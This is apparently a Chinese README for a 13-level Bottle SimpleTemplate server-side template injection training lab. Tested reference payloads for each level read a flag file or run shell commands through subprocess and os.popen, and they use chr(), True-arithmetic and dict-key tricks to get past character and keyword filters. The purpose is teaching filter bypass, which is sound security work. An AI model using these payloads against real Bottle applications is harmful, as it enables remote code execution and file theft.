# 09 · Bottle SimpleTemplate 13 关 WAF 链

| | |
|---|---|
| 端口 | `8099`（`BOTTLE_CHAIN_PORT` 可改） |
| 引擎 | Bottle `SimpleTemplate`（`SimpleTemplate(...).render()`） |
| 关卡数 | 13（id `0`–`12`） |
| 依赖网络 | 否 |
| flag | 容器内 `/flag`，由环境变量写入 |

## 这个靶场在教什么

与 02/03/04 **同构的第 4 条 13 关链**，目标是 Bottle 的 `SimpleTemplate`。
它补上了 02–04 没覆盖的一块：**「编译成 Python」+「Jinja 式花括号」** 的组合形态，
也是 `ssti_core` 里预留已久的 `bottle` 渲染器的正式启用。

Bottle 与 Jinja 的语法面像，求值模型却和 Mako 一类：

| | Jinja2 | Bottle SimpleTemplate |
|---|---|---|
| 模板怎么执行 | 编译成 Python 函数（受限表达式子集） | **`exec(code, env)`，`env` 就是模板 globals** |
| 表达式 | `{{ ... }}` | `{{ ... }}`（自动 HTML 转义）、`!{{ ... }}`（原始输出） |
| 代码块 | 无 | `% 行代码`、`<% ... %>%>`（`%>` 后必须换行） |
| 写输出 | `{{ }}` / `{% print %}` | `{{ }}`、代码块里的 **`_stdout`（list）/ `_printlist`（=`_stdout.extend`）** |
| 循环/条件 | `{% for %}` / `{% if %}` | 原生 Python（`% for x in y:` 行语法） |

**两个关键事实**（都可在上帝模式里验证）：

1. 内置函数全部直接可用 —— `{{open('/flag').read()}}` 不需要任何 gadget 链；
   上一关被封的只是「写法」，不是「能力」。
2. `{{` 被拦 ≠ 没有回显。代码块里的 `_stdout` / `_printlist` 是模板编译环境
   自己的输出原语，`<% _printlist((str(7*7),),) %>` 照样把内容写进响应。

上下文注入见 `shared/ssti_core/engines/bottle.py`：只有 Flask 侧的
`request` / `session` / `config`（+ 模板机制名）。**没有 `lipsum` / `cycler`** ——
在 02 靶场练熟的那条 `lipsum.__globals__` 链在这里不存在，请从内置函数出发。

## 关卡表

| id | 关卡 | 过滤内容 | 关键思路 |
|----|------|----------|----------|
| 0 | L1 无过滤 | — | `{{7*7}}`；`{{open('/flag').read()}}` |
| 1 | L2 拦截 `{{` | 子串 `{{` | `<% _printlist((str(7*7),),) %>` —— 代码块写输出 |
| 2 | L3 盲编译/渲染 | 无过滤，只回显 `correct`/`wrong` | 语法错误也落进 `wrong`；把数据变成成功/失败 |
| 3 | L4 禁止方括号 | `[` `]` | 直接读全文，不要切片 |
| 4 | L5 禁止引号 | `'` `"` | `chr(47)+chr(102)+...` 逐字节拼路径 |
| 5 | L6 禁止下划线 | `_` | 上一条的 `chr()` 链本来就不需要下划线 |
| 6 | L7 禁止点号 | `.` | `getattr(obj, chr(...))()` 完全替代 `obj.attr()` |
| 7 | L8 关键字黑名单 | 12 个子串（大小写敏感） | `__import__('subprocess').getoutput(...)` 一个子串都不含 |
| 8 | L9 禁止数字 | `0`–`9` | `request.args` 带字符串；或 `True` 参与算术 |
| 9 | L10 前缀置空 config | 载荷前拼 `<% config = None %>` | 换入口：`open` / `__import__` 不受影响 |
| 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `str(bytes((…)), 编码)` 造串 + `min(dict(kw=…))` 取属性名 |
| 11 | L12 强字符集 | 再加 `_`、数字、`\` | `True` 参与算术让 `chr()` 复活；`dict(flag=…)` 白嫖文件名 |
| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | `<% from subprocess import getoutput %>` + `str(bytes(...))` |

表格里的过滤内容逐字取自 `shared/ssti_core/levels/bottle.py` 的 `WafSpec`，
可用 `GET /api/god/source?level=<id>` 或前端「关卡源码」按钮当场核对。

## 参考解

下面标注「✅ 实测」的 payload 在本仓库开发环境（Python 3.14 / Bottle 0.13）经
`Level.render()` 实际执行过，输出为观测原文；容器内的等价形态（`/flag` 为目标）
由 `tests/audit_solvability.py` 与 `scripts/verify_labs.py` 覆盖。
flag 来自 `cat` 一个本地 flag 文件（容器内即 `/flag`）。

### L1（id 0）无过滤 ✅

```bottle
{{7*7}}                     → 49
{{open('/flag').read()}}    → flag{...}
!{{ '<b>' }}                → <b>（原始输出；{{ '<b>' }} → &lt;b&gt;，自动转义）
```

### L2（id 1）拦截 `{{` ✅

`%>` 后必须换行（SimpleTemplate 的解析约束），写成多行：

```bottle
<% _printlist((str(7*7),),) %>          → 49
% _stdout.append(str(7*7))              → 49
<% _stdout.append(open('/flag').read()) %>   → flag{...}
```

`_printlist` = `_stdout.extend`，元素必须已是字符串（它不会替你转 `str`）。

### L3（id 2）盲编译/渲染 ✅

```bottle
hello                    → ok:true,  output:"correct"（raw_output:"hello"）
{{ 1/+ }}                → ok:false, output:"wrong"（编译期 SyntaxError）
{{open('/flag').read()}} → ok:true,  output:"correct"（raw_output 即 flag，仅上帝模式可见）
```

### L4（id 3）禁止方括号 ✅

```bottle
{{open('/flag').read()}}   → flag{...}（本就不需要下标）
```

### L5（id 4）禁止引号 ✅

```bottle
{{open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}   → flag{...}
```

### L6（id 5）禁止下划线 ✅

```bottle
{{open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}   → flag{...}
```

注意这条链里没有 `__import__` 也没有 `_stdout` —— 带下划线的名字一个都不出现。

### L7（id 6）禁止点号 ✅

```bottle
{{getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))()}}
→ flag{...}
```

### L8（id 7）关键字子串黑名单 ✅

被禁：`class` `arg` `form` `value` `data` `request` `init` `global` `open` `mro` `base` `attr`。

```bottle
{{open('/flag').read()}}                          → WAF（命中 `open`）
{{getattr(1,2)}}                                  → WAF（命中 `attr`）
{{__import__('subprocess').getoutput('cat /flag')}}   → flag{...}（三个名字都不含被禁子串）
```

### L9（id 8）禁止数字 ✅

```bottle
{{getattr(getattr(__import__('os'),'popen')(request.args.c),'read')()}}
（?c=cat /flag）                                    → flag{...}
{{True+True}}                                       → 2
```

### L10（id 9）前缀置空 config ✅

`template_after_waf` 里能看到 `<% config = None %>` 被拼在载荷前面。
`config` 变量没了，内置函数与 `{% %}` 语句不受影响：

```bottle
{{7*7}}                                       → 49
{{open('/flag').read()}}                      → flag{...}
```

### L11（id 10）组合过滤 ✅

过滤：`'` `"` `+` `.` `[` `]` 与子串 `request`。

突破口与 03 靶场同构：**关键字参数不需要引号** —— `dict(os=1)|first`…
等等，Bottle 没有 Jinja 过滤器，这里用的是纯 Python 的 `min(dict(os=1))`
（对 dict 求最小值 = 最小的键），键名直接变成字符串；再用
`str(bytes((…)), 编码)` 无引号、无加号地造出任意字节串：

```bottle
{{getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}
→ flag{...}
```

拆开看：`min(dict(os=1))` → `'os'`；`__import__('os')`；`min(dict(popen=1))` → `'popen'`；
`str(bytes((99,97,116,32,47,102,108,97,103)), 'utf8')` → `'cat /flag'`；
最后 `getattr(管道, 'read')()`。

### L12（id 11）强字符集 ✅

在 L11 之上再禁 `_`、数字与反斜杠。`+` 与 `True` 都还在：
`True` 参与乘法凑出 `47`（`chr('/')`），文件名 `flag` 从键名白嫖：

```bottle
{{getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True+True+True+True+True+True+True)-True)+min(dict(flag=True))),min(dict(read=True)))()}}
→ flag{...}
```

`4 × 12 - 1 = 47` —— `chr(47)` 就是 `/`；`open('/'+'flag')` 直读 flag。

### L13（id 12）扩展关键字与符号 ✅

符号 `_ . \ ' " + [ ]` 与子串 `request/class/init/arg/config/app/self` 全部封死。
`getattr` 含 `attr` 被禁，但**代码块里的 `from x import y` 语句不在黑名单里**，
`str(bytes((…)), 编码)` 造串不需要任何被禁字符，数字也仍然可用：

```bottle
<% from subprocess import getoutput %>
{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}
→ flag{...}
```

（`subprocess` / `getoutput` 逐个对过子串表：`class`/`arg`/`config`/`app`/`self`/`init`
都不在里面。）

## 验证

```bash
# 本靶场单独起
cd labs/09-bottle-chain && docker compose up --build -d

# 冒烟探针（含上面每关的参考解）
python scripts/verify_labs.py 09

# 全链可解性审计
python tests/audit_solvability.py 09
```

## 出网与免责声明

本靶场与 02–04 一样**没有**切断出网：教学重点是过滤绕过而非不出网利用。
请在隔离环境使用；`/flag` 只是本地演示值。
